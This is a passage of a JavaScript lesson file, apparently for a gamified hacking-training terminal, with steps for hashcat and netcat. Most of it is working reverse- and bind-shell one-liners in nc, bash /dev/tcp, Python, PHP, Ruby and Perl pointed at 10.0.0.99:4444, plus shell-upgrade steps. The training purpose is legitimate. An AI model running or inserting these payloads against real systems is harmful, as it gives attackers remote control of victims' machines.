      objective: "Append to custom.txt",
      xp: 15,
      check: (c, a) =>
        c === "echo" && a.includes(">>") && a.includes("custom.txt"),
    },
    {
      title: "Verify Custom Wordlist",
      why: "Verify the structural layout of the new dictionary.",
      text: "Type <code>cat custom.txt</code>",
      objective: "Read custom.txt",
      xp: 10,
      check: (c, a) => c === "cat" && a[0] === "custom.txt",
    },
    {
      title: "Hashcat Custom",
      why: "Execute an ultra-fast directed attack using your custom profile list.",
      text: "Type <code>hashcat -m 0 -a 0 hash.txt custom.txt</code>",
      objective: "Run hashcat with custom.txt",
      xp: 25,
      check: (c, a) => c === "hashcat" && a.includes("custom.txt"),
    },

    // --- PHASE 5: NETCAT & SHELL CATCHING (81-100) ---
    {
      title: "Netcat Listen",
      why: "You cannot catch a reverse shell without a listener. <b>nc -lvnp 4444</b> binds to port 4444 on your machine, instructing the kernel to accept any incoming TCP handshakes.",
      text: "Type <code>nc -lvnp 4444</code>",
      objective: "Type nc -lvnp 4444",
      xp: 25,
      check: (c, a) => c === "nc" && a.includes("-lvnp") && a.includes("4444"),
    },
    {
      title: "Netcat Connect",
      why: "Connect outward. This opens a raw TCP socket to the target, allowing you to interact directly with whatever protocol is running on that port.",
      text: "Type <code>nc 10.0.0.50 4444</code>",
      objective: "Connect nc to 10.0.0.50 4444",
      xp: 20,
      check: (c, a) => c === "nc" && a[0] === "10.0.0.50" && a[1] === "4444",
    },
    {
      title: "Netcat Port Scan",
      why: "If Nmap is blocked, use Netcat. <b>-z</b> (Zero-I/O) mode initiates a TCP handshake, reports if the port is open, and instantly drops the connection without transmitting data.",
      text: "Type <code>nc -zv 10.0.0.50 20-100</code>",
      objective: "Type nc -zv",
      xp: 30,
      check: (c, a) => c === "nc" && a.includes("-zv") && a.includes("20-100"),
    },
    {
      title: "Netcat File Receiver",
      why: "Netcat handles raw byte streams. By redirecting the output (<b>></b>) of a listening socket, any data sent to that port is automatically written directly to a file on the hard drive.",
      text: "Type <code>nc -lvnp 4444 > received.txt</code>",
      objective: "Redirect nc to received.txt",
      xp: 35,
      check: (c, a) =>
        c === "nc" &&
        a.includes("-lvnp") &&
        a.includes(">") &&
        a.includes("received.txt"),
    },
    {
      title: "Netcat File Sender",
      why: "Connect to the receiver and use the <b>&lt;</b> operator to dump a file directly into the outgoing TCP network stream.",
      text: "Type <code>nc 10.0.0.50 4444 < custom.txt</code>",
      objective: "Push custom.txt via nc",
      xp: 35,
      check: (c, a) =>
        c === "nc" && a.includes("<") && a.includes("custom.txt"),
    },
    {
      title: "Netcat Reverse Shell",
      why: "The holy grail. Piping <code>/bin/bash</code> into Netcat (<b>-e</b>) binds the shell's standard input, output, and error streams directly to the TCP socket connecting back to the attacker.",
      text: "Type <code>nc 10.0.0.99 4444 -e /bin/bash</code>",
      objective: "Type nc -e /bin/bash",
      xp: 50,
      check: (c, a) =>
        c === "nc" && a.includes("-e") && a.includes("/bin/bash"),
    },
    {
      title: "Netcat Sh Shell",
      why: "Many minimalist Linux distros (like Alpine) do not have bash installed. Fall back to the Bourne shell (<b>/bin/sh</b>) to guarantee execution.",
      text: "Type <code>nc 10.0.0.99 4444 -e /bin/sh</code>",
      objective: "Type nc -e /bin/sh",
      xp: 50,
      check: (c, a) => c === "nc" && a.includes("-e") && a.includes("/bin/sh"),
    },
    {
      title: "Netcat Bind Shell",
      why: "Instead of connecting out, bind `/bin/bash` directly to a listening port on the victim machine. Anyone who connects to port 4444 instantly receives root terminal access.",
      text: "Type <code>nc -lvnp 4444 -e /bin/bash</code>",
      objective: "Type nc -lvnp with -e /bin/bash",
      xp: 50,
      check: (c, a) =>
        c === "nc" &&
        a.includes("-lvnp") &&
        a.includes("-e") &&
        a.includes("/bin/bash"),
    },
    {
      title: "Upgrade TTY Shell",
      why: "A raw reverse shell is 'dumb' and lacks tab-completion or Ctrl+C stability. Invoking the Python <b>pty</b> module spawns an interactive bash session, tricking the kernel into treating the socket like a real monitor.",
      text: "Type <code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'</code>",
      objective: "Use python3 pty.spawn",
      xp: 40,
      check: (c, a) =>
        c === "python3" &&
        a.includes("-c") &&
        a.some((x) => x.includes("pty.spawn")),
    },
    {
      title: "Background Shell",
      why: "To finalize the TTY upgrade, you must pause the active shell session via SIGSTOP (Ctrl+Z) to regain control of your local terminal.",
      text: "Type <code>kill -STOP %1</code>",
      objective: "Type kill -STOP %1",
      xp: 20,
      check: (c, a) => c === "kill" && a.includes("-STOP") && a.includes("%1"),
    },
    {
      title: "Stty Raw",
      why: "Normally, your local terminal intercepts keystrokes. <b>stty raw -echo</b> disables local interception, passing raw keystrokes (like Ctrl+C) directly through the TCP tunnel to the victim.",
      text: "Type <code>stty raw -echo</code>",
      objective: "Type stty raw -echo",
      xp: 30,
      check: (c, a) => c === "stty" && a.includes("raw") && a.includes("-echo"),
    },
    {
      title: "Foreground Shell",
      why: "Bring the backgrounded Netcat shell back to the active screen. Your keystrokes are now perfectly mapped to the remote session.",
      text: "Type <code>fg %1</code>",
      objective: "Type fg %1",
      xp: 20,
      check: (c, a) => c === "fg" && a[0] === "%1",
    },
    {
      title: "Export Terminal",
      why: "Tell the victim shell what kind of terminal rendering environment you are using so commands like 'clear' and 'nano' draw correctly on your screen.",
      text: "Type <code>export TERM=xterm</code>",
      objective: "Type export TERM=xterm",
      xp: 20,
      check: (c, a) => c === "export" && a.includes("TERM=xterm"),
    },
    {
      title: "Bash Reverse Shell",
      why: "If Netcat isn't installed, leverage native Bash handlers. <b>/dev/tcp</b> is a special file descriptor. This command maps bash input/output directly to the kernel's raw TCP stack.",
      text: "Type <code>bash -i >& /dev/tcp/10.0.0.99/4444 0>&1</code>",
      objective: "Create bash -i reverse shell",
      xp: 50,
      check: (c, a) =>
        c === "bash" &&
        a.includes("-i") &&
        a.includes(">&") &&
        a.some((x) => x.includes("/dev/tcp")),
    },
    {
      title: "Python Reverse Shell",
      why: "If only Python is installed, generate a reverse shell by importing the `socket` and `os` libraries, duplicating file descriptors, and mapping them to a subprocess shell.",
      text: 'Type <code>python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.99",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'</code>',
      objective: "Run python3 reverse shell string",
      xp: 50,
      check: (c, a) =>
        c === "python3" &&
        a.includes("-c") &&
        a.some((x) => x.includes("socket.socket")),
    },
    {
      title: "PHP Reverse Shell",
      why: "If attacking a web server, bypass binary restrictions by calling the native `fsockopen()` PHP function to bind the shell stream.",
      text: 'Type <code>php -r \'$sock=fsockopen("10.0.0.99",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'</code>',
      objective: "Run php reverse shell",
      xp: 50,
      check: (c, a) =>
        c === "php" &&
        a.includes("-r") &&
        a.some((x) => x.includes("fsockopen")),
    },
    {
      title: "Ruby Reverse Shell",
      why: "Utilize the native Ruby TCP Socket classes to execute standard I/O redirection.",
      text: 'Type <code>ruby -rsocket -e\'f=TCPSocket.open("10.0.0.99",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'</code>',
      objective: "Run ruby reverse shell",
      xp: 50,
      check: (c, a) =>
        c === "ruby" &&
        a.includes("-rsocket") &&
        a.includes('-e\'f=TCPSocket.open("10.0.0.99",4444).to_i;exec'),
    },
    {
      title: "Perl Reverse Shell",
      why: "Use the legacy Perl Socket module to establish the connection and fork the process tree into a terminal.",
      text: 'Type <code>perl -e \'use Socket;$i="10.0.0.99";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'</code>',
      objective: "Run perl reverse shell",
      xp: 50,
      check: (c, a) =>
        c === "perl" &&
        a.includes("-e") &&
        a.some((x) => x.includes("use Socket")),
    },
    {
      title: "Check Connections",
      why: "Confirm your network states are clean.",
      text: "Type <code>ss -tulnp</code>",
      objective: "Type ss -tulnp",
      xp: 15,
      check: (c, a) => c === "ss" && a.includes("-tulnp"),
    },
    {
      title: "Exploitation Complete",
      why: "You understand Shellcode Compilation, Password Cryptography, and Advanced TCP Redirection. You have mastered weaponization.",
      text: 'Type <code>echo "I am a Kernel God"</code>',
      objective: "Type echo",
      xp: 50,
      check: (c, a) => c === "echo" && a.some((x) => x.includes("Kernel")),
    },
  ],
};
